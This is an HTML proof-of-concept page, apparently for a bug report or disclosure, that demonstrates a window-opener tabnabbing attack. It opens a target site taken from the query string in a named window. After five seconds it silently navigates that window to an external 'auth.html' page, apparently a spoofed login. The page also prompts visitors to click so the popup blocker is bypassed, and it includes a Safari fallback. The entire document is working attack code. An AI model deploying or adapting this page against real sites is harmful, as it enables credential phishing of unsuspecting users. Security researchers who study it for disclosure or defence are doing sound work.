<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>POC</title>
  <style>
    body { margin: 0; background: white; cursor: pointer; }
    #msg {
      position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
      font-family: sans-serif; color: #aaa; font-size: 14px; text-align: center;
    }
  </style>
</head>
<body onclick="openTarget()">
  <div id="msg">If the site did not automatically redirect to the target, click anywhere in the white background.</div>

<script>
  const params = new URLSearchParams(window.location.search);
  const target = params.get('target');
  let win;
  let pollTimer;

  function openTarget() {
    if (!target) return;
    win = window.open(target, 'victimWindow');

    if (!win || win.closed || typeof win.closed === 'undefined') {
      document.getElementById('msg').textContent =
        'Popup was blocked. Please click anywhere to continue the demonstration.';
      return;
    }

    document.getElementById('msg').style.display = 'none';
    startPolling();
  }

  function startPolling() {
    let elapsed = 0;
    pollTimer = setInterval(() => {
      elapsed += 500;

      if (elapsed >= 5000) {
        clearInterval(pollTimer);
        navigateAway();
      }
    }, 500);
  }

  function navigateAway() {
    try {
      if (win && !win.closed) {
        win.location = 'https://chrpz.github.io/coop-poc/auth.html';
      }
    } catch (e) {
      // Safari severed the opener — fallback
      document.getElementById('msg').textContent =
        'Safari prevented automatic navigation. Click anywhere to proceed.';
      document.getElementById('msg').style.display = 'block';

      // On click, redirect current page instead as fallback demo
      document.body.onclick = () => {
        window.open('https://chrpz.github.io/coop-poc/auth.html', 'victimWindow');
      };
    }
  }

  // Click handler for manual popup unblock
  document.body.onclick = openTarget;

  // Auto-trigger on load
  window.onload = () => setTimeout(openTarget, 1500);
</script>
</body>
</html>
